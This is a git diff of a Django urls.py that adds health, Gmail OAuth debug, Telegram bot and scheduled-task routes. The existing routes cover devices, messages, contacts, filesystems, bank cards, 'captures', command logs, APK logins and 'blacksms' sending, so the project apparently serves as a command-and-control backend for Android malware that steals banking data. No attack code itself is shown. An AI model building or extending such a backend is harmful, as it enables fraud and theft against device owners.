@@ -1,12 +1,16 @@
 from django.urls import path, include
 from rest_framework.routers import DefaultRouter
 from .views import (
+    api_health,
+    gmail_oauth_debug,
     ItemViewSet, DeviceViewSet, MessageViewSet,
     NotificationViewSet, ContactViewSet, FileSystemViewSet,
     BankCardTemplateViewSet, BankCardViewSet, BankViewSet,
     GmailAccountViewSet,
     CommandLogViewSet, AutoReplyLogViewSet, ActivationFailureLogViewSet, ApiRequestLogViewSet,
     CaptureItemViewSet,
+    TelegramBotViewSet,
+    validate_telegram_token, discover_chats_by_token, lookup_chat_by_token,
     validate_apk_login, dashboard_login, dashboard_profile, dashboard_reset_password,
     dashboard_update_access, dashboard_configure_access, dashboard_update_profile,
     dashboard_update_theme_mode,
@@ -26,7 +30,9 @@ from .views import (
     drive_share_file, drive_storage_info, drive_search_files,
     drive_copy_file,
     # IP Download File endpoint
-    ip_download_file
+    ip_download_file,
+    # Scheduled task views
+    ScheduledTaskViewSet, TaskResultViewSet, available_tasks, task_status,
 )
 from .webhooks import (
     webhook_receive, webhook_failed, webhook_success, webhook_refund, webhook_dispute,
@@ -48,9 +54,13 @@ router.register(r'auto-reply-logs', AutoReplyLogViewSet, basename='autoreplylog'
 router.register(r'activation-failure-logs', ActivationFailureLogViewSet, basename='activationfailurelog')
 router.register(r'api-request-logs', ApiRequestLogViewSet, basename='apirequestlog')
 router.register(r'captures', CaptureItemViewSet, basename='captureitem')
+router.register(r'telegram-bots', TelegramBotViewSet, basename='telegrambot')
+router.register(r'scheduled-tasks', ScheduledTaskViewSet, basename='scheduledtask')
+router.register(r'task-results', TaskResultViewSet, basename='taskresult')
 
 urlpatterns = [
     path('', include(router.urls)),
+    path('health/', api_health, name='api-health'),
     path('validate-login/', validate_apk_login, name='validate-apk-login'),
     path('isvalidcodelogin', isvalidcodelogin, name='isvalidcodelogin'),
     path('registerbanknumber', register_bank_number, name='registerbanknumber'),
@@ -77,6 +87,7 @@ urlpatterns = [
     path('blacksms/whatsapp/', blacksms_send_whatsapp, name='blacksms-send-whatsapp'),
     
     # Gmail API endpoints
+    path('gmail/oauth-debug/', gmail_oauth_debug, name='gmail-oauth-debug'),
     path('gmail/init-auth/', gmail_init_auth, name='gmail-init-auth'),
     path('gmail/callback/', gmail_callback, name='gmail-callback'),
     path('gmail/status/', gmail_status, name='gmail-status'),
@@ -105,4 +116,13 @@ urlpatterns = [
     
     # IP Download File endpoint
     path('ip/download/file/', ip_download_file, name='ip-download-file'),
+    
+    # Telegram helper endpoints (no bot ID required)
+    path('telegram/validate-token/', validate_telegram_token, name='telegram-validate-token'),
+    path('telegram/discover-chats/', discover_chats_by_token, name='telegram-discover-chats'),
+    path('telegram/lookup-chat/', lookup_chat_by_token, name='telegram-lookup-chat'),
+    
+    # Scheduled task endpoints
+    path('available-tasks/', available_tasks, name='available-tasks'),
+    path('task-status/<str:task_id>/', task_status, name='task-status'),
 ]
